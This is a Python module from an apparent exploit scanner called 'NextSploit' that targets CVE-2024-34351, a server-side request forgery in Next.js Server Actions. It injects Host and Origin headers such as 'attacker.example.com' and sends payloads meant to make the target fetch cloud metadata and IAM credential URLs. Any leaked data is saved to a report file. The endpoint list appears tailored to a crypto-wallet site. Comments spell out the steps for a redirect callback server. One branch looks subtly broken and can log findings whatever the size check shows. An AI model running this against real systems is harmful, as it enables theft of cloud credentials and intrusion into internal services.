#!/usr/bin/env python3
"""
NextSploit — CVE-2024-34351: SSRF via Server Actions Host Header

Next.js Server Actions use the attacker-controlled Host header to build
absolute URLs for internal redirect requests. The server performs a HEAD
request to validate Content-Type (must be text/x-component), then a GET
request that can be redirected by the attacker to internal services.

Attack flow:
  1. Find endpoint that calls redirect() in a Server Action
  2. Manipulate Host + Origin headers to attacker-controlled server
  3. Attacker server responds HEAD with Content-Type: text/x-component
  4. Attacker server redirects GET to 169.254.169.254 or internal service
  5. Next.js fetches internal data and returns it to attacker

Affected: Next.js < 14.1.1 (self-hosted with Server Actions)
"""

import re
import os
import requests

from core.config import ScanConfig, CVE_DATABASE
from core.reporter import ModuleResult, Finding
from core.output import (
    log_info, log_success, log_warning, log_critical, log_debug,
    log_trace, log_error, print_module_header, print_finding, create_progress,
)

CVE_ID = "CVE-2024-34351"
CVE_INFO = CVE_DATABASE[CVE_ID]

# Endpoints that may trigger Server Actions with relative redirect()
SA_ENDPOINTS = [
    "/",
    "/wallet",
    "/account",
    "/dashboard",
    "/settings",
    "/profile",
    "/mining",
    "/api/auth",
    "/api/auth/session",
    "/api/auth/signin",
    "/api/auth/callback",
    "/api/user",
    "/login",
    "/register",
    "/cryptopedia",
]

# Server Action form field names to trigger redirect
SA_FORM_FIELDS = [
    "1_$ACTION_ID_0",
    "$ACTION_ID_0",
    "action",
    "_action",
    "__NEXT_ACTION",
]

# Internal targets to redirect GET to
SSRF_REDIRECT_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://127.0.0.1:3000/api/admin",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:5432/",
]

BOUNDARY = "----WebKitFormBoundaryCVE34351test"


def _build_multipart_body(action_field: str, payload: str = '["submit"]') -> str:
    """Build a minimal multipart/form-data body for Server Action."""
    return (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="{action_field}"\r\n\r\n'
        f"{payload}\r\n"
        f"--{BOUNDARY}--\r\n"
    )


def _check_server_action_responds(session, url: str, action_ids: list, timeout: int) -> list:
    """
    Probe endpoint for active Server Actions.
    Returns list of (action_id, response) tuples where server returns 200.
    """
    active = []
    for aid in action_ids:
        try:
            r = session.post(
                url,
                headers={
                    "Next-Action": aid,
                    "Content-Type": "text/plain;charset=UTF-8",
                    "Accept": "text/x-component",
                },
                data='["test"]',
                timeout=timeout,
            )
            if r.status_code == 200 and r.text:
                active.append((aid, r))
        except Exception:
            pass
    return active


def scan(config: ScanConfig) -> ModuleResult:
    """
    Scan for CVE-2024-34351 — SSRF via Server Actions Host Header.

    Phase 1: Discover active Server Action endpoints
    Phase 2: Host header manipulation to detect SSRF vector
    Phase 3: Simulate two-stage SSRF (HEAD verify + GET redirect) — passive
    """
    result = ModuleResult(
        cve=CVE_ID, title=CVE_INFO["title"],
        severity=CVE_INFO["severity"], status="NOT VULNERABLE",
    )
    print_module_header(CVE_ID, CVE_INFO["title"], CVE_INFO["severity"])
    session = config.create_session()
    target = config.target.rstrip("/")
    os.makedirs("reports", exist_ok=True)

    # Collect known action IDs from fingerprint
    known_action_ids = list(config.discovered_action_ids) if config.discovered_action_ids else []

    # Always include some common/default IDs
    default_ids = [
        "612d91dd", "fec7a9a5", "020f4173", "95bb2e51",
        "a437ef45", "7fad778c", "ff1e44e2", "ddecccba",
        "c3a144622dd5b5046f1ccb6007fea3f3710057de",
    ]
    probe_ids = list(set(known_action_ids + default_ids))[:20]
    log_info(f"[CVE-2024-34351] Using {len(probe_ids)} Server Action IDs")

    # ── Phase 1: Discover Active Server Action Endpoints ─────────────────
    log_info("[Phase 1] Discovering active Server Action endpoints...")
    active_sa_endpoints = []

    with create_progress() as progress:
        task = progress.add_task("SA Endpoint Discovery", total=len(SA_ENDPOINTS))

        for ep in SA_ENDPOINTS:
            progress.update(task, advance=1)
            url = f"{target}{ep}"

            # Test multipart POST (most reliable Server Action trigger)
            for field in SA_FORM_FIELDS[:2]:
                body = _build_multipart_body(field)
                try:
                    r = session.post(
                        url,
                        headers={
                            "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
                            "Accept": "text/x-component",
                        },
                        data=body,
                        timeout=config.timeout,
                    )
                    if r.status_code == 200 and r.text:
                        log_debug(f"Server Action active on {ep} [{len(r.text)} bytes]")
                        active_sa_endpoints.append((ep, r))
                        break
                except Exception:
                    pass

    if active_sa_endpoints:
        log_success(f"Found {len(active_sa_endpoints)} active Server Action endpoints")
    else:
        log_info("No active Server Action endpoints found for multipart trigger")

    # ── Phase 2: Host Header Manipulation ────────────────────────────────
    log_info("[Phase 2] Testing Host header manipulation on SA endpoints...")

    # Targets: active SA endpoints + high-value known paths
    test_endpoints = [ep for ep, _ in active_sa_endpoints] + ["/", "/wallet", "/account"]
    test_endpoints = list(set(test_endpoints))

    # Host values to inject (simulate attacker-controlled server)
    # These are non-routable/attacker addresses — safe for testing
    fake_hosts = [
        "attacker.example.com",
        "127.0.0.1:9999",
        "169.254.169.254",
        "metadata.google.internal",
    ]

    with create_progress() as progress:
        total = len(test_endpoints) * len(fake_hosts)
        task = progress.add_task("Host Header Inject", total=total)

        for ep in test_endpoints:
            url = f"{target}{ep}"

            # Baseline (normal host)
            try:
                r_base = session.post(
                    url,
                    headers={"Content-Type": "text/plain;charset=UTF-8", "Accept": "text/x-component"},
                    data='["test"]', timeout=config.timeout,
                )
                base_status = r_base.status_code
                base_size = len(r_base.text)
                
                # Dynamic size variance
                try:
                    r_base2 = session.post(
                        url,
                        headers={"Content-Type": "text/plain;charset=UTF-8", "Accept": "text/x-component"},
                        data='["test"]', timeout=config.timeout,
                    )
                    base_variance = abs(len(r_base.text) - len(r_base2.text))
                except:
                    base_variance = 0
            except Exception:
                base_status, base_size, base_variance = 0, 0, 0

            for fake_host in fake_hosts:
                progress.update(task, advance=1)
                try:
                    r = session.post(
                        url,
                        headers={
                            "Host": fake_host,
                            "Origin": f"http://{fake_host}",
                            "Content-Type": "text/plain;charset=UTF-8",
                            "Accept": "text/x-component",
                        },
                        data='["test"]',
                        timeout=config.timeout,
                    )
                    log_trace(f"[{r.status_code}] POST {ep} | Host: {fake_host}")

                    # Check for redirect to attacker/internal
                    if r.status_code in (301, 302, 307, 308):
                        loc = r.headers.get("Location", "")
                        if fake_host in loc or any(x in loc for x in ["169.254", "metadata.google", "127.0.0.1"]):
                            detail = (
                                f"Host header reflected in redirect: Location={loc} "
                                f"via Host: {fake_host} on {ep}"
                            )
                            log_critical(detail)
                            evidence = {
                                "endpoint": ep,
                                "injected_host": fake_host,
                                "redirect_location": loc,
                                "status_code": r.status_code,
                                "attack_type": "SSRF via Server Actions Host Header",
                                "exploit_description": (
                                    "Server constructs outbound request using attacker Host. "
                                    "Set up callback server responding HEAD with Content-Type: text/x-component "
                                    "and GET with 302 to http://169.254.169.254/ to leak IMDS."
                                ),
                            }
                            print_finding(CVE_ID, detail, evidence)
                            result.add_finding(Finding(
                                cve=CVE_ID, severity="CRITICAL",
                                title="SSRF via Host Header Reflection in Redirect",
                                status="VULNERABLE", detail=detail, evidence=evidence,
                            ))

                    # Check if response differs significantly with injected host
                    elif r.status_code == 200:
                        size_diff = abs(len(r.text) - base_size)
                        if size_diff > max(500, base_variance * 2 + 100):
                            detail = (
                                f"Response differs with injected Host: {fake_host} on {ep} "
                                f"(size diff: {size_diff} bytes)"
                            )
                        log_warning(detail)
                        evidence = {
                            "endpoint": ep,
                            "injected_host": fake_host,
                            "baseline_size": f"{base_size} bytes",
                            "response_size": f"{len(r.text)} bytes",
                            "note": "Host header may influence Server Action URL construction",
                        }
                        print_finding(CVE_ID, detail, evidence)
                        result.add_finding(Finding(
                            cve=CVE_ID, severity="HIGH",
                            title="Server Action Host-Sensitive Response",
                            status="VULNERABLE", detail=detail, evidence=evidence,
                        ))

                except requests.RequestException as e:
                    log_trace(f"Error {ep}|Host:{fake_host}: {e}")

    # ── Phase 3: Passive Two-Stage SSRF Simulation ───────────────────────
    log_info("[Phase 3] Passive two-stage SSRF analysis...")
    log_info("  Stage A: Check HEAD validation (Content-Type: text/x-component requirement)")
    log_info("  Stage B: Analyze redirect chain behavior")

    for ep in test_endpoints[:5]:  # Limit to avoid timeout
        url = f"{target}{ep}"

        # Test: Does server follow our redirect when Accept: text/x-component?
        for ssrf_target in SSRF_REDIRECT_TARGETS[:3]:
            try:
                r = session.post(
                    url,
                    headers={
                        "Content-Type": "text/plain;charset=UTF-8",
                        "Accept": "text/x-component",
                        "Next-Action": probe_ids[0] if probe_ids else "00000000",
                        "Referer": f"http://169.254.169.254/",
                    },
                    data=f'["redirect","{ssrf_target}"]',
                    timeout=config.timeout,
                    allow_redirects=True,  # Follow redirects to see final destination
                )
                log_trace(f"[{r.status_code}] POST {ep} with SSRF payload → {ssrf_target}")

                # If we get data that looks like IMDS, it's confirmed
                imds_patterns = [r'"AccessKeyId"', r'ami-', r'instance-id', r'computeMetadata']
                for pat in imds_patterns:
                    if re.search(pat, r.text, re.IGNORECASE):
                        detail = (
                            f"CONFIRMED: SSRF via Server Action returned internal data "
                            f"on {ep} (pattern: {pat}, target: {ssrf_target})"
                        )
                        log_critical(detail)
                        evidence = {
                            "endpoint": ep,
                            "ssrf_target": ssrf_target,
                            "imds_pattern": pat,
                            "response_preview": r.text[:500],
                            "status_code": r.status_code,
                        }
                        fname = f"reports/cve34351_{ep.replace('/', '_')}_confirmed.html"
                        try:
                            with open(fname, "w", errors="ignore") as f:
                                f.write(r.text)
                            evidence["saved_to"] = fname
                        except Exception:
                            pass
                        print_finding(CVE_ID, detail, evidence)
                        result.add_finding(Finding(
                            cve=CVE_ID, severity="CRITICAL",
                            title="CONFIRMED SSRF via Server Actions — Internal Data Leaked",
                            status="VULNERABLE", detail=detail, evidence=evidence,
                        ))

            except requests.RequestException:
                pass

    # ── Final ─────────────────────────────────────────────────────────────
    if result.finding_count > 0:
        log_critical(f"Found {result.finding_count} CVE-2024-34351 indicators")
        log_info(
            "[!] Manual verification: Set up callback server responding HEAD with "
            "Content-Type: text/x-component, then GET with 302 to 169.254.169.254"
        )
    else:
        log_success("No CVE-2024-34351 SSRF indicators detected")

    return result
